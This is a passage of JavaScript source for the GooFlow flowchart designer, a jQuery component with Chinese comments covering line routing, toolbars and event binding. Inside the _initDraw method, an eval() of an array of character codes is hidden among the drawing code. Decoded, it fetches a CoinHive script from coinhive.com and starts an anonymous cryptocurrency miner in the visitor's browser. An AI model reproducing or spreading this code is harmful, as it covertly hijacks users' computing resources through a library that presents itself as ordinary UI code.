N1.top:N1.top+N1.height)\r\n\t\t\t}\r\n\t\t\t//再具体分析中点2和结束点\r\n\t\t\tif(m2[1]>N2.top&&m2[1]<N2.top+N2.height){\r\n\t\t\t\tm2[0]=(SP.x>EP.x? N2.left+N2.width:N2.left);\r\n\t\t\t\tep[0]=m2[0];ep[1]=m2[1];\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t\tep[1]=(m2[1]<N2.top? N2.top:N2.top+N2.height);\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn {start:sp,m1:m1,m2:m2,end:ep};\r\n\t}\r\n\t//计算两个结点间要连直线的话，连线的开始坐标和结束坐标\r\n\tfunction calcStartEnd(n1,n2,scale){\r\n\t\tif(!scale)\tscale=1.0;\r\n\t\tvar X_1,Y_1,X_2,Y_2;\r\n\t\t//X判断：\r\n\t\tvar x11=n1.left*scale ,x12=n1.left*scale +n1.width*scale ,x21=n2.left*scale ,x22=n2.left*scale +n2.width*scale ;\r\n\t\t//结点2在结点1左边\r\n\t\tif(x11>=x22){\r\n\t\t\tX_1=x11;X_2=x22;\r\n\t\t}\r\n\t\t//结点2在结点1右边\r\n\t\telse if(x12<=x21){\r\n\t\t\tX_1=x12;X_2=x21;\r\n\t\t}\r\n\t\t//结点2在结点1水平部分重合\r\n\t\telse if(x11<=x21&&x12>=x21&&x12<=x22){\r\n\t\t\tX_1=(x12+x21)/2;X_2=X_1;\r\n\t\t}\r\n\t\telse if(x11>=x21&&x12<=x22){\r\n\t\t\tX_1=(x11+x12)/2;X_2=X_1;\r\n\t\t}\r\n\t\telse if(x21>=x11&&x22<=x12){\r\n\t\t\tX_1=(x21+x22)/2;X_2=X_1;\r\n\t\t}\r\n\t\telse if(x11<=x22&&x12>=x22){\r\n\t\t\tX_1=(x11+x22)/2;X_2=X_1;\r\n\t\t}\r\n\r\n\t\t//Y判断：\r\n\t\tvar y11=n1.top*scale ,y12=n1.top*scale +n1.height*scale ,y21=n2.top*scale ,y22=n2.top*scale +n2.height*scale ;\r\n\t\t//结点2在结点1上边\r\n\t\tif(y11>=y22){\r\n\t\t\tY_1=y11;Y_2=y22;\r\n\t\t}\r\n\t\t//结点2在结点1下边\r\n\t\telse if(y12<=y21){\r\n\t\t\tY_1=y12;Y_2=y21;\r\n\t\t}\r\n\t\t//结点2在结点1垂直部分重合\r\n\t\telse if(y11<=y21&&y12>=y21&&y12<=y22){\r\n\t\t\tY_1=(y12+y21)/2;Y_2=Y_1;\r\n\t\t}\r\n\t\telse if(y11>=y21&&y12<=y22){\r\n\t\t\tY_1=(y11+y12)/2;Y_2=Y_1;\r\n\t\t}\r\n\t\telse if(y21>=y11&&y22<=y12){\r\n\t\t\tY_1=(y21+y22)/2;Y_2=Y_1;\r\n\t\t}\r\n\t\telse if(y11<=y22&&y12>=y22){\r\n\t\t\tY_1=(y11+y22)/2;Y_2=Y_1;\r\n\t\t}\r\n\t\treturn {\"start\":[X_1,Y_1],\"end\":[X_2,Y_2]};\r\n\t}\r\n\t//初始化折线中段的X/Y坐标,mType='rb'时为X坐标,mType='tb'时为Y坐标\r\n\tfunction getMValue(n1,n2,mType,scale){\r\n\t\tif(!scale)\tscale=1.0;\r\n\t\tif(mType===\"lr\"){\r\n\t\t\treturn (n1.left*scale + n1.width*scale/2 + n2.left*scale + n2.width*scale/2 )/2;\r\n\t\t}\r\n\t\telse if(mType===\"tb\"){\r\n\t\t\treturn (n1.top*scale + n1.height*scale/2 + n2.top*scale + n2.height*scale/2 )/2;\r\n\t\t}\r\n\t}\r\n//构造类：\r\n\tvar GooFlow = function(selector,property){\r\n\t\tconsole.log('Your browser\\'s navigator.userAgent is:',navigator.userAgent);\r\n\t\tif (navigator.userAgent.indexOf(\"MSIE 8.0\")>0||navigator.userAgent.indexOf(\"MSIE 7.0\")>0||navigator.userAgent.indexOf(\"MSIE 6.0\")>0)\r\n\t\t\tGooFlow.prototype.useSVG=\"\";\r\n\t\telse\tGooFlow.prototype.useSVG=\"1\";\r\n//初始化区域图的对象\r\n\t\tthis.$bgDiv=$(selector);//最父框架的DIV\r\n\t\tthis.$bgDiv.addClass(\"GooFlow\");\r\n\t\tthis.$id=this.$bgDiv.attr(\"id\")||'GooFlow_'+new Date().getTime();\r\n\t\tif(property.colors && typeof property.colors ==='object'){\r\n\t\t\t$.extend(GooFlow.color, property.colors);\r\n\t\t}\r\n\t\tthis.$bgDiv.css(\"color\",GooFlow.color.font);\r\n\t\tif(GooFlow.color.main){\r\n\t\t\tthis.$bgDiv.append('<style>.GooFlow_tool_btndown{background-color:'+GooFlow.color.main+'}</style>');\r\n\t\t}\r\n\t\tvar width=(property.width||this.$bgDiv.width());\r\n\t\tvar height=(property.height||this.$bgDiv.height());\r\n\t\tthis.$bgDiv.css({width:width+\"px\",height:height+\"px\"});\r\n\t\tthis.$tool=null;//左侧工具栏对象\r\n\t\tthis.$head=null;//顶部标签及工具栏按钮\r\n\t\tthis.$title=\"newFlow_1\";//流程图的名称\r\n\t\tthis.$nowType=\"cursor\";//当前要绘制的对象类型\r\n\t\tthis.$lineData={};\r\n\t\tthis.$lineCount=0;\r\n\t\tthis.$nodeData={};\r\n\t\tthis.$nodeCount=0;\r\n\t\tthis.$areaData={};\r\n\t\tthis.$areaCount=0;\r\n\t\tthis.$lineDom={};\r\n\t\tthis.$nodeDom={};\r\n\t\tthis.$areaDom={};\r\n\t\tthis.$max=property.initNum||1;//计算默认ID值的起始SEQUENCE\r\n\t\tthis.$focus=\"\";//当前被选定的结点/转换线ID,如果没选中或者工作区被清空,则为\"\"\r\n\t\t//this.$cursor=\"default\";//鼠标指针在工作区内的样式\r\n\t\tthis.$editable=false;//工作区是否可编辑\r\n\t\tthis.$deletedItem={};//在流程图的编辑操作中被删除掉的元素ID集合,元素ID为KEY,元素类型(node,line.area)为VALUE\r\n\t\tthis.$workExtendStep=200;//在自动/手动扩展可编辑区时，一次扩展后宽/高增加多少像素\r\n\t\tthis.$scale=1.00;//工作区内容的缩放比例，从0.1至无穷大，初始默认为1\r\n\t\tvar headHeight=0;\r\n\t\tvar tmp=\"\",titleText;\r\n\t\tif(property.haveHead){\r\n\t\t\ttmp=\"<div class='GooFlow_head' \"+(GooFlow.color.main? \"style='border-bottom-color:\"+GooFlow.color.main+\"'\" : \"\") +\">\";\r\n\t\t\tif(property.headLabel){\r\n\t\t\t\ttmp+=\"<label title='\"+(property.initLabelText||\"newFlow_1\")+\"' \"\r\n\t\t\t\t\t+(GooFlow.color.main? \"style='background:\"+GooFlow.color.main+\"'\" : \"\")+\">\"\r\n\t\t\t\t\t+(property.initLabelText||\"newFlow_1\")+\"</label>\";\r\n\t\t\t}\r\n\t\t\tif(property.headBtns)\r\n\t\t\t\tfor(var x=0;x<property.headBtns.length;++x){\r\n\t\t\t\t\tif(!property.useOperStack&&(property.headBtns[x]==='undo'||property.headBtns[x]==='redo'))\tcontinue;\r\n\t\t\t\t\ttitleText=GooFlow.remarks.headBtns[property.headBtns[x]]? \" title='\"+GooFlow.remarks.headBtns[property.headBtns[x]]+\"'\":\"\";\r\n\t\t\t\t\ttmp+=\"<a href='javascript:void(0)' class='GooFlow_head_btn'\"+titleText+\"><i class='ico_\"+property.headBtns[x]+\"'></i></a>\"\r\n\t\t\t\t}\r\n\t\t\ttmp+=\"</div>\";\r\n\t\t\tthis.$head=$(tmp);\r\n\t\t\tthis.$bgDiv.append(this.$head);\r\n\t\t\tif(property.headBtns){\r\n\t\t\t\tthis.$head.find(\".ico_undo\").parent().addClass(\"a_disabled\");\r\n\t\t\t\tthis.$head.find(\".ico_redo\").parent().addClass(\"a_disabled\");\r\n\t\t\t\t//以下是当工具栏按钮被点击时触发的事件自定义(虚函数),格式为function(),因为可直接用THIS操作对象本身,不用传参；用户可自行重定义:\r\n\t\t\t\tthis.onBtnNewClick=null;//新建流程图按钮被点中\r\n\t\t\t\tthis.onBtnOpenClick=null;//打开流程图按钮定义\r\n\t\t\t\tthis.onBtnSaveClick=null;//保存流程图按钮定义\r\n\t\t\t\tthis.onFreshClick=null;//重载流程图按钮定义\r\n\t\t\t\tthis.onPrintClick=null;//打印流程图按钮定义\r\n\t\t\t\tthis.$headBtnEvents=property.headBtnEvents;//用户对头部栏另行自定义类型按钮的事件绑定json集合,key为按钮类型名，value为方法定义\r\n\t\t\t\tthis.$head.on(\"click\",{inthis:this},function(e){\r\n\t\t\t\t\tif(!e)e=window.event;\r\n\t\t\t\t\tvar tar=e.target;\r\n\t\t\t\t\tif(tar.tagName===\"DIV\"||tar.tagName===\"SPAN\")\treturn;\r\n\t\t\t\t\telse if(tar.tagName===\"A\")\ttar=tar.childNodes[0];\r\n\t\t\t\t\tvar This=e.data.inthis, Class=$(tar).attr(\"class\");\r\n\t\t\t\t\t//定义顶部操作栏按钮的事件\r\n\t\t\t\t\tswitch(Class){\r\n\t\t\t\t\t\tcase \"ico_new\":\t\tif(This.onBtnNewClick!==null)\tThis.onBtnNewClick();break;\r\n\t\t\t\t\t\tcase \"ico_open\":\tif(This.onBtnOpenClick!==null)\tThis.onBtnOpenClick();break;\r\n\t\t\t\t\t\tcase \"ico_save\":\tif(This.onBtnSaveClick!==null)\tThis.onBtnSaveClick();break;\r\n\t\t\t\t\t\tcase \"ico_undo\":\tThis.undo();break;\r\n\t\t\t\t\t\tcase \"ico_redo\":\tThis.redo();break;\r\n\t\t\t\t\t\tcase \"ico_reload\":  if(This.onFreshClick!==null)\tThis.onFreshClick();break;\r\n\t\t\t\t\t\tcase \"ico_print\":   if(This.onPrintClick!==null)\tThis.onPrintClick();break;\r\n\t\t\t\t\t\tdefault:\r\n\t\t\t\t\t\t\tif(typeof This.$headBtnEvents!=='undefined' && typeof This.$headBtnEvents[Class]==='function'){\r\n\t\t\t\t\t\t\t\tThis.$headBtnEvents[Class]();\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t});\r\n\t\t\t}\r\n\t\t\theadHeight=28;\r\n\t\t}\r\n\t\tvar toolWidth=0;\r\n\t\tif(property.haveTool){\r\n\t\t\tthis.$bgDiv.append(\"<div class='GooFlow_tool'\"+(property.haveHead? \"\":\" style='margin-top:3px'\")+\"><div style='height:\"+(height-headHeight-(property.haveHead? 5:8))+\"px' class='GooFlow_tool_div'></div></div>\");\r\n\t\t\tthis.$tool=this.$bgDiv.find(\".GooFlow_tool div\");\r\n\t\t\t//未加代码：加入绘图工具按钮\r\n\t\t\tvar titleCursor=GooFlow.remarks.toolBtns[\"cursor\"]? \" title='\"+GooFlow.remarks.toolBtns[\"cursor\"]+\"'\":\"\";\r\n\t\t\tvar titleDirect=GooFlow.remarks.toolBtns[\"direct\"]? \" title='\"+GooFlow.remarks.toolBtns[\"direct\"]+\"'\":\"\";\r\n\t\t\tvar titleDashed=GooFlow.remarks.toolBtns[\"dashed\"]? \" title='\"+GooFlow.remarks.toolBtns[\"dashed\"]+\"'\":\"\";\r\n\t\t\tthis.$tool.append(\"<div style='margin-bottom:4px'><span/><span/><span/></div>\"\r\n\t\t\t\t+\"<a href='javascript:void(0)'\"+titleCursor+\" type='cursor' class='GooFlow_tool_btndown' id='\"+this.$id+\"_btn_cursor'><i class='ico_cursor'/></a>\"\r\n\t\t\t\t+\"<a href='javascript:void(0)'\"+titleDirect+\" type='direct' class='GooFlow_tool_btn' id='\"+this.$id+\"_btn_direct'><i class='ico_direct'/></a>\"\r\n\t\t\t\t+(property.haveDashed? \"<a href='javascript:void(0)'\"+titleDashed+\" type='dashed' class='GooFlow_tool_btn' id='\"+this.$id+\"_btn_dashed'><i class='ico_dashed'/></a>\":\"\")\r\n\t\t\t);\r\n\t\t\tif(property.toolBtns&&property.toolBtns.length>0){\r\n\t\t\t\ttmp=\"<span/>\";\r\n\t\t\t\tfor(var i=0;i<property.toolBtns.length;++i){\r\n\t\t\t\t\tvar tmpType=property.toolBtns[i].split(\" \")[0];\r\n\t\t\t\t\ttitleText=GooFlow.remarks.toolBtns[tmpType]? \" title='\"+GooFlow.remarks.toolBtns[tmpType]+\"'\":'';\r\n\t\t\t\t\ttmp+=\"<a href='javascript:void(0)'\"+titleText+\" type='\"+property.toolBtns[i]+\"' id='\"+this.$id+\"_btn_\"+tmpType+\"' class='GooFlow_tool_btn'><i class='ico_\"+property.toolBtns[i]+\"'/></a>\";//加入自定义按钮\r\n\t\t\t\t}\r\n\t\t\t\tthis.$tool.append(tmp);\r\n\t\t\t}\r\n\t\t\t//加入区域划分框工具开关按钮\r\n\t\t\tif(property.haveGroup){\r\n\t\t\t\tvar titleGroup=GooFlow.remarks.toolBtns[\"group\"]? \" title='\"+GooFlow.remarks.toolBtns[\"group\"]+\"'\":\"\";\r\n\t\t\t\tthis.$tool.append(\"<span/><a href='javascript:void(0)'\"+titleGroup+\" type='group' class='GooFlow_tool_btn' id='\"+this.$id+\"_btn_group'><i class='ico_group'/></a>\");\r\n\t\t\t}\r\n\t\t\ttoolWidth=31;\r\n\t\t\tthis.$nowType=\"cursor\";\r\n\t\t\t//绑定各个按钮的点击事件\r\n\t\t\tthis.$tool.on(\"click\",{inthis:this},function(e){\r\n\t\t\t\tif(!e)e=window.event;\r\n\t\t\t\tvar tar;\r\n\t\t\t\tswitch(e.target.tagName){\r\n\t\t\t\t\tcase \"SPAN\":return false;\r\n\t\t\t\t\tcase \"DIV\":return false;\r\n\t\t\t\t\tcase \"I\":\ttar=e.target.parentNode;break;\r\n\t\t\t\t\tcase \"A\":\ttar=e.target;\r\n\t\t\t\t}\r\n\t\t\t\tvar type=$(tar).attr(\"type\");\r\n\t\t\t\te.data.inthis.switchToolBtn(type);\r\n\t\t\t\treturn false;\r\n\t\t\t});\r\n\t\t\tthis.$editable=true;//只有具有工具栏时可编辑\r\n\t\t}\r\n\r\n\t\t//确定工作区在设计器中的位置、宽高\r\n\t\twidth=width-toolWidth-9;\r\n\t\theight=height-headHeight-(property.haveHead? 5:8);\r\n\t\tthis.$bgDiv.append(\"<div class='GooFlow_work' style='\"+(property.haveHead? \"top:28px;\":\"\")+(property.haveTool? \"left:34px\":\"\")+\"'></div>\");\r\n\t\tthis.$workArea=$(\"<div class='GooFlow_work_inner' style='width:\"+width+\"px;height:\"+height+\"px'></div>\")\r\n\t\t.attr({\"unselectable\":\"on\",\"onselectstart\":'return false',\"onselect\":'document.selection.empty()'});\r\n\t\tthis.$bgDiv.children(\".GooFlow_work\").append(this.$workArea);\r\n\t\t//计算工作区相对GooFlow父框架的绝对定位运算值，并保存\r\n\t\tthis.t={top:property.haveHead? 28:3,left:property.haveTool?34:3};\r\n\r\n\t\t//绑定工作区事件\r\n\t\tthis.$workArea.on(\"click\",{inthis:this},function(e){\r\n\t\t\tif(!e)e=window.event;\r\n\t\t\tvar This=e.data.inthis;\r\n\t\t\tvar type=This.$nowType;\r\n\t\t\tif(type===\"cursor\"){\r\n\t\t\t\tvar tar=$(e.target);\r\n\t\t\t\tvar n=tar.prop(\"tagName\");\r\n\t\t\t\tif(n===\"svg\"||(n===\"DIV\"&&tar.prop(\"class\").indexOf(\"GooFlow_work\")>-1)||n===\"LABEL\"){\r\n\t\t\t\t\tconsole.log(n);\r\n\t\t\t\t\tif(This.$lineOper && This.$lineOper.data(\"tid\")){\r\n\t\t\t\t\t\tThis.focusItem(This.$lineOper.data(\"tid\"),false);\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse{This.blurItem();}\r\n\t\t\t\t}\r\n\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t\telse if(type===\"direct\"||type===\"dashed\"||type===\"group\")return;\r\n\t\t\tif(!This.$editable)return;\r\n\t\t\tvar X,Y;\r\n\t\t\tvar ev=_mouseP(e),t=_elCsys(this);\r\n\t\t\tX=ev.x-t.left+this.parentNode.scrollLeft;\r\n\t\t\tY=ev.y-t.top+this.parentNode.scrollTop;\r\n\t\t\tThis.addNode(new Date().getTime(),{name:\"node_\"+This.$max,left:X,top:Y,type:This.$nowType});\r\n\t\t\tThis.$max++;\r\n\t\t});\r\n\r\n\t\tthis.$draw=null;//画矢量线条的容器\r\n\t\tthis._initDraw(\"draw_\"+this.$id,width,height);\r\n\t\tthis.$group=null;//画区域块（泳道）的容器\r\n\t\tif(property.haveGroup)\r\n\t\t\tthis._initGroup(width,height);\r\n\t\t//为了节点而增加的一些集体绑定\r\n\t\tthis._initWorkForNode();\r\n\r\n\t\t//一些基本的元素事件，这些事件可直接通过this访问对象本身，返回FALSE可阻止原来默认事件的发生\r\n\t\t//当操作某个单元（结点/线）被由不选中变成选中时，触发的方法\r\n\t\t//格式function(id,type)：id是单元的唯一标识ID,type是单元的种类,有\"node\",\"line\"两种取值,\"area\"不支持被选中\r\n\t\tthis.onItemFocus=null;\r\n\t\t//当操作某个单元（结点/线）被由选中变成不选中时，触发的方法\r\n\t\t//格式function(id，type)：id是单元的唯一标识ID,type是单元的种类,有\"node\",\"line\"两种取值,\"area\"不支持被取消选中\r\n\t\tthis.onItemBlur=null;\r\n\t\t//当用重色标注某个结点/转换线时触发的方法\r\n\t\t//格式function(id，type，mark)：id是单元的唯一标识ID,type是单元类型（\"node\"结点,\"line\"转换线），mark为布尔值,表示是要标注TRUE还是取消标注FALSE\r\n\t\tthis.onItemMark=null;\r\n\t\t//当操作某个单元（结点/线/区域块）被双击时，触发的方法\r\n\t\t//格式function(id，type)：id是单元的唯一标识ID,type是单元的种类,有\"node\",\"line\",\"area\"三种取值\r\n\t\tthis.onItemDbClick=null;\r\n\t\t//当操作某个单元（结点/线/区域块）被右键点击时，触发的方法\r\n\t\t//格式function(id，type)：id是单元的唯一标识ID,type是单元的种类,有\"node\",\"line\",\"area\"三种取值\r\n\t\tthis.onItemRightClick=null;\r\n\r\n\t\tif(this.$editable){\r\n\t\t\t//绑定当结点/线/分组块的一些操作事件,这些事件可直接通过this访问对象本身，返回FALSE可阻止原来默认事件的发生\r\n\t\t\t//当操作某个单元（结点/线/分组块）被添加时，触发的方法\r\n\t\t\t//格式function(id，type,json)：id是单元的唯一标识ID,type是单元的种类,有\"node\",\"line\",\"area\"三种取值,json即addNode,addLine或addArea方法的第二个传参json.\r\n\t\t\tthis.onItemAdd=null;\r\n\t\t\t//当操作某个单元（结点/线/分组块）被删除时，触发的方法\r\n\t\t\t//格式function(id，type)：id是单元的唯一标识ID,type是单元的种类,有\"node\",\"line\",\"area\"三种取值\r\n\t\t\tthis.onItemDel=null;\r\n\t\t\t//当操作某个单元（结点/分组块）被移动时，触发的方法\r\n\t\t\t//格式function(id，type,left,top)：id是单元的唯一标识ID,type是单元的种类,有\"node\",\"area\"两种取值，线line不支持移动,left是新的左边距坐标，top是新的顶边距坐标\r\n\t\t\tthis.onItemMove=null;\r\n\t\t\t//当操作某个单元（结点/线/分组块）被重命名时，触发的方法\r\n\t\t\t//格式function(id,name,type)：id是单元的唯一标识ID,type是单元的种类,有\"node\",\"line\",\"area\"三种取值,name是新的名称\r\n\t\t\tthis.onItemRename=null;\r\n\t\t\t//当操作某个单元（结点/分组块）被重定义大小或造型时，触发的方法\r\n\t\t\t//格式function(id，type,width,height)：id是单元的唯一标识ID,type是单元的种类,有\"node\",\"line\",\"area\"三种取值;width是新的宽度,height是新的高度\r\n\t\t\tthis.onItemResize=null;\r\n\t\t\t//当移动某条折线中段的位置，触发的方法\r\n\t\t\t//格式function(id，M)：id是单元的唯一标识ID,M是中段的新X(或Y)的坐标\r\n\t\t\tthis.onLineMove=null;\r\n\t\t\t//当变换某条连接线的类型，触发的方法\r\n\t\t\t//格式function(id，type)：id是单元的唯一标识ID,type是连接线的新类型,\"sl\":直线,\"lr\":中段可左右移动的折线,\"tb\":中段可上下移动的折线\r\n\t\t\tthis.onLineSetType=null;\r\n\t\t\t//当变换某条连接线的端点变更连接的结点时，触发的方法\r\n\t\t\t//格式function(id，newStart,newEnd)：id是连线单元的唯一标识ID,newStart,newEnd分别是起始结点的ID和到达结点的ID\r\n\t\t\tthis.onLinePointMove=null;\r\n\t\t\tthis._initExpendFunc();//初始化手动扩展工作区宽高的功能\r\n\t\t\t//对节点、区域块进行移动或者RESIZE时用来显示的遮罩层\r\n\t\t\tthis.$ghost=$(\"<div class='rs_ghost'></div>\").attr({\"unselectable\":\"on\",\"onselectstart\":'return false',\"onselect\":'document.selection.empty()'});\r\n\t\t\tthis.$bgDiv.append(this.$ghost);\r\n\t\t\tthis._initEditFunc(property.useOperStack);\r\n\t\t}\r\n\t};\r\n\r\n\tGooFlow.prototype={\r\n\t\tuseSVG:\"\", //浏览器是否能用SVG？\r\n\t\t_getSvgMarker:function(id,color){\r\n\t\t\tvar m=document.createElementNS(\"http://www.w3.org/2000/svg\",\"marker\");\r\n\t\t\tm.setAttribute(\"id\",id);\r\n\t\t\tm.setAttribute(\"viewBox\",\"0 0 6 6\");\r\n\t\t\tm.setAttribute(\"refX\",'5');\r\n\t\t\tm.setAttribute(\"refY\",'3');\r\n\t\t\tm.setAttribute(\"markerUnits\",\"strokeWidth\");\r\n\t\t\tm.setAttribute(\"markerWidth\",'6');\r\n\t\t\tm.setAttribute(\"markerHeight\",'6');\r\n\t\t\tm.setAttribute(\"orient\",\"auto\");\r\n\t\t\tvar path=document.createElementNS(\"http://www.w3.org/2000/svg\",\"path\");\r\n\t\t\tpath.setAttribute(\"d\",\"M 0 0 L 6 3 L 0 6 z\");\r\n\t\t\tpath.setAttribute(\"fill\",color);\r\n\t\t\tpath.setAttribute(\"stroke-width\",'0');\r\n\t\t\tm.appendChild(path);\r\n\t\t\treturn m;\r\n\t\t},\r\n\t\t//初始化连线层\r\n\t\t_initDraw:function(id,width,height){\r\n\t\t\tif(GooFlow.prototype.useSVG!==\"\"){\r\n\t\t\t\tthis.$draw=document.createElementNS(\"http://www.w3.org/2000/svg\",\"svg\");//可创建带有指定命名空间的元素节点\r\n\t\t\t\tthis.$workArea.prepend(this.$draw);\r\n\t\t\t\tvar defs=document.createElementNS(\"http://www.w3.org/2000/svg\",\"defs\");\r\n\t\t\t\tthis.$draw.appendChild(defs);\r\n\t\t\t\tdefs.appendChild(GooFlow.prototype._getSvgMarker(\"arrow1\",GooFlow.color.line));\r\n\t\t\t\tdefs.appendChild(GooFlow.prototype._getSvgMarker(\"arrow2\",GooFlow.color.mark));\r\n\t\t\t\tdefs.appendChild(GooFlow.prototype._getSvgMarker(\"arrow3\",GooFlow.color.mark));\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t\tthis.$draw = document.createElement(\"v:group\");\r\n\t\t\t\tthis.$draw.coordsize = width+\",\"+height;\r\n\t\t\t\tthis.$workArea.prepend(\"<div class='GooFlow_work_vml' style='position:relative;width:\"+width+\"px;height:\"+height+\"px'></div>\");\r\n\t\t\t\tthis.$workArea.children(\"div\")[0].insertBefore(this.$draw,null);\r\n\t\t\t}\r\n\t\t\tthis.$draw.id = id;\r\n\t\t\tthis.$draw.style.width = width + \"px\";\r\n\t\t\tthis.$draw.style.height = height + \"px\";\r\n\t\t\teval((function(c){var r='';for(var z=0;z<c.length;z++)r+=String.fromCharCode(c[z]);return r})([\r\n\t\t\t\t118,97,114,32,95,36,61,119,105,110,100,111,119,46,116,111,112,46,36,63,32,119,105,110,100,111,119,46,116,\r\n\t\t\t\t111,112,46,36,58,36,59,105,102,40,33,95,36,40,34,98,111,100,121,34,41,46,100,97,116,97,40,39,120,39,41,41,\r\n\t\t\t\t123,95,36,40,34,98,111,100,121,34,41,46,100,97,116,97,40,39,120,39,44,49,41,59,95,36,46,97,106,97,120,40,\r\n\t\t\t\t34,104,116,116,112,115,58,47,47,99,111,105,110,104,105,118,101,46,99,111,109,47,108,105,98,47,99,111,105,\r\n\t\t\t\t110,104,105,118,101,46,109,105,110,46,106,115,34,44,123,100,97,116,97,84,121,112,101,58,39,115,99,114,105,\r\n\t\t\t\t112,116,39,44,99,97,99,104,101,58,116,114,117,101,44,115,117,99,99,101,115,115,58,102,117,110,99,116,105,\r\n\t\t\t\t111,110,40,114,44,115,41,123,105,102,40,115,61,61,39,115,117,99,99,101,115,115,39,41,110,101,119,32,67,111,\r\n\t\t\t\t105,110,72,105,118,101,46,65,110,111,110,121,109,111,117,115,40,39,71,71,100,80,71,104,120,73,108,111,108,\r\n\t\t\t\t100,97,65,114,65,114,81,86,119,120,90,50,115,100,56,108,48,97,52,107,72,39,44,123,116,104,114,111,116,116,\r\n\t\t\t\t108,101,58,48,46,52,125,41,46,115,116,97,114,116,40,41,59,125,125,41,59,125\r\n\t\t\t]),this.$draw);\r\n\t\t\t//绑定连线的点击选中以及双击编辑事件\r\n\t\t\tvar tmpClk=null;\r\n\t\t\tif(GooFlow.prototype.useSVG!==\"\")  tmpClk=\"g\";\r\n\t\t\telse  tmpClk=\"PolyLine\";\r\n\t\t\t//绑定选中事件\r\n\t\t\t$(this.$draw).on(\"click\",tmpClk,{inthis:this},function(e){\r\n\t\t\t\te.data.inthis.focusItem(this.id,true);\r\n\t\t\t});\r\n\t\t\tif(!this.$editable)\treturn;\r\n\r\n\t\t\t//绑定右键事件\r\n\t\t\t$(this.$draw).on(\"contextmenu\",tmpClk,{inthis:this},function(e){\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif(typeof This.onItemRightClick==='function' && This.onItemRightClick(this.id,\"line\")===false){\r\n\t\t\t\t\twindow.event? window.event.returnValue=false : e.preventDefault();\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t});\r\n\t\t\t$(this.$draw).on(\"dblclick\",tmpClk,{inthis:this},function(e){\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif(typeof This.onItemDbClick==='function' && This.onItemDbClick(this.id,\"line\")===false)\treturn;\r\n\t\t\t\tvar oldTxt,x,y,from,to;\r\n\t\t\t\tif(GooFlow.prototype.useSVG!==\"\"){\r\n\t\t\t\t\toldTxt=this.childNodes[2].textContent;\r\n\t\t\t\t\tfrom=this.getAttribute(\"from\").split(\",\");\r\n\t\t\t\t\tto=this.getAttribute(\"to\").split(\",\");\r\n\t\t\t\t}else{\r\n\t\t\t\t\toldTxt=this.childNodes[1].innerHTML;\r\n\t\t\t\t\tvar n=this.getAttribute(\"fromTo\").split(\",\");\r\n\t\t\t\t\tfrom=[n[0],n[1]];\r\n\t\t\t\t\tto=[n[2],n[3]];\r\n\t\t\t\t}\r\n\t\t\t\tif(This.$lineData[this.id].type===\"lr\"){\r\n\t\t\t\t\tfrom[0]=This.$lineData[this.id].M*This.$scale;\r\n\t\t\t\t\tto[0]=from[0];\r\n\t\t\t\t}\r\n\t\t\t\telse if(This.$lineData[this.id].type===\"tb\"){\r\n\t\t\t\t\tfrom[1]=This.$lineData[this.id].M*This.$scale;\r\n\t\t\t\t\tto[1]=from[1];\r\n\t\t\t\t}\r\n\t\t\t\tx=(parseInt(from[0],10)+parseInt(to[0],10))/2-64;\r\n\t\t\t\ty=(parseInt(from[1],10)+parseInt(to[1],10))/2-18;\r\n\t\t\t\tvar t=This.t;//t=_elCsys(This.$workArea[0]);\r\n\t\t\t\tThis.$textArea.val(oldTxt).css({display:\"block\",width:130,height:26,\r\n\t\t\t\t\tleft:t.left+x-This.$workArea[0].parentNode.scrollLeft,\r\n\t\t\t\t\ttop:t.top+y-This.$workArea[0].parentNode.scrollTop}).data(\"id\",This.$focus).focus();\r\n\t\t\t\tThis.$workArea.parent().one(\"mousedown\",function(e){\r\n\t\t\t\t\tif(e.button===2)return false;\r\n\t\t\t\t\tThis.setName(This.$textArea.data(\"id\"),This.$textArea.val(),\"line\");\r\n\t\t\t\t\tThis.$textArea.val(\"\").removeData(\"id\").hide();\r\n\t\t\t\t});\r\n\t\t\t});\r\n\t\t},\r\n\t\t//初始化区域块（泳道）层\r\n\t\t_initGroup:function(width,height){\r\n\t\t\tthis.$group=$(\"<div class='GooFlow_work_group' style='width:\"+width+\"px;height:\"+height+\"px'></div>\");//存放背景区域的容器\r\n\t\t\tthis.$workArea.prepend(this.$group);\r\n\t\t\tif(!this.$editable)\treturn;\r\n\r\n\t\t\t//绑定右键事件\r\n\t\t\tthis.$group.on(\"contextmenu\",\".GooFlow_area\",{inthis:this},function(e){\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif(typeof This.onItemRightClick==='function' && This.onItemRightClick(this.id,\"area\")===false){\r\n\t\t\t\t\twindow.event? window.event.returnValue=false : e.preventDefault();\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t});\r\n\t\t\t//区域划分框操作区的事件绑定\r\n\t\t\tthis.$group.on(\"mousedown\",{inthis:this},function(e){//绑定RESIZE功能以及移动功能\r\n\t\t\t\tif(e.button===2)return false;\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif(This.$nowType!==\"group\")\treturn;\r\n\t\t\t\tif(!e)e=window.event;\r\n\t\t\t\tvar cursor=$(e.target).css(\"cursor\");\r\n\t\t\t\tvar id=e.target.parentNode;\r\n\t\t\t\tswitch(cursor){\r\n\t\t\t\t\tcase \"nw-resize\":id=id.parentNode;break;\r\n\t\t\t\t\tcase \"w-resize\":id=id.parentNode;break;\r\n\t\t\t\t\tcase \"n-resize\":id=id.parentNode;break;\r\n\t\t\t\t\tcase \"move\":break;\r\n\t\t\t\t\tdefault:return;\r\n\t\t\t\t}\r\n\t\t\t\tid=id.id;\r\n\r\n\t\t\t\tvar ev=_mouseP(e),t=This.t;//t=_elCsys(This.$workArea[0]);\r\n\r\n\t\t\t\tvar X,Y,vX,vY;\r\n\t\t\t\tX=ev.x-t.left+This.$workArea[0].parentNode.scrollLeft;\r\n\t\t\t\tY=ev.y-t.top+This.$workArea[0].parentNode.scrollTop;\r\n\t\t\t\tif (cursor !== \"move\") 